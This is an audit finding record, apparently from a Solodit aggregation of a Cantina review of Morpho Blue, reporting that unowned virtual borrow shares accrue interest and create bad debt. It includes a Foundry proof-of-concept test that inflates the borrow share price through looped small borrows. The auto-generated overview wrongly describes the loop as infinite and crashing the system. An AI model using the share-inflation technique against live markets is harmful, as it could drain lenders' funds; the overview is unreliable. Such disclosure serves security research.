---
# Core Classification
protocol: Morpho
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 40872
audit_firm: Cantina
contest_link: https://cantina.xyz/portfolio/b695ccbb-9d8b-4cac-be69-706f8c3684e5
source_link: https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf
github_link: none

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - cdp
  - derivatives
  - dexes
  - services
  - yield_aggregator

# Audit Details
report_date: unknown
finders_count: 2
finders:
  - Christoph Michel
  - xuwinnie
---

## Vulnerability Title

Virtual borrow shares accrue interest and lead to bad debt 

### Overview


The bug report is about a function called _accrueInterest in the code Morpho.sol#L478. This function causes virtual borrow shares to earn interest even if they are not owned by anyone. This interest keeps compounding and cannot be repaid, leading to a reduction in withdrawable funds. This is because the function calculates withdrawable funds as supplyAssets - borrowAssets, and the interest earned by the virtual borrow shares increases the borrow assets, resulting in bad debt. The report recommends that the virtual borrow shares should not earn interest as there is no way to repay them. The report also mentions an appendix that shows how the borrow share price can be inflated, leading to an attack on the system. The code provided in the appendix demonstrates how the share price can be increased, resulting in an infinite loop and causing the system to crash. The report concludes by stating that the borrow shares should not earn interest as they are bad debt and cannot be repaid.

### Original Finding Content

## Morpho.sol#L478

## Description
The virtual borrow shares, that are not owned by anyone, earn interest in *accrueInterest*. This interest keeps compounding and cannot be repaid as the virtual borrow shares are not owned by anyone. As the withdrawable funds are computed as `supplyAssets - borrowAssets`, the borrow shares' assets equivalent leads to a reduction in withdrawable funds, essentially creating bad debt. Note that while the initial borrow shares only account for 1 asset, this can be increased by raising the share price. The share price can be inflated arbitrarily high; see appendix.

## Recommendation
There is no virtual collateral equivalent, and therefore the virtual borrow assets are bad debt that cannot even be repaid and socialized. The virtual borrow shares should not earn interest.

## Appendix: Increasing the Borrow Share Price
```solidity
function testBorrowInflationAttack() public {
    uint256 amountCollateral = 1e6 ether;
    _supply(amountCollateral);
    oracle.setPrice(1 ether);
    collateralToken.setBalance(BORROWER, amountCollateral);
    vm.startPrank(BORROWER);
    morpho.supplyCollateral(marketParams, amountCollateral, BORROWER, hex"");
    morpho.borrow(marketParams, 1e4, 0, BORROWER, RECEIVER);
    
    for (uint256 i = 0; i < 100; i++) {
        // assets = shares * (totalBorrowAssets + 1) / (totalBorrowShares + 1e6) < 1 <=> shares < (totalBorrowShares + 1e6) / (totalBorrowAssets + 1).
        (,, uint256 totalBorrowAssets, uint256 totalBorrowShares) = morpho.expectedMarketBalances(marketParams);
        console2.log("totalBorrowShares", totalBorrowShares);
        uint256 shares = (totalBorrowShares + 1e6).mulDivUp(1, totalBorrowAssets + 1) - 1;
        console2.log("shares", shares);
        (uint256 returnAssets, uint256 returnShares) = morpho.borrow(marketParams, 0, shares, BORROWER, RECEIVER);
        
        uint256 borrowBalance = morpho.expectedBorrowAssets(marketParams, BORROWER);
        // console2.log("borrowBalance", borrowBalance);
    }
    
    (,, uint256 totalBorrowAssets, uint256 totalBorrowShares) = morpho.expectedMarketBalances(marketParams);
    console2.log("final totalBorrowShares", totalBorrowShares);
    vm.expectRevert("max uint128 exceeded");
    morpho.borrow(marketParams, 1 ether, 0, BORROWER, RECEIVER);
}
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Cantina |
| Protocol | Morpho |
| Report Date | N/A |
| Finders | Christoph Michel, xuwinnie |

### Source Links

- **Source**: https://cdn.cantina.xyz/reports/cantina_competition_morpho_blue_dec2023.pdf
- **GitHub**: N/A
- **Contest**: https://cantina.xyz/portfolio/b695ccbb-9d8b-4cac-be69-706f8c3684e5

### Keywords for Search

`vulnerability`

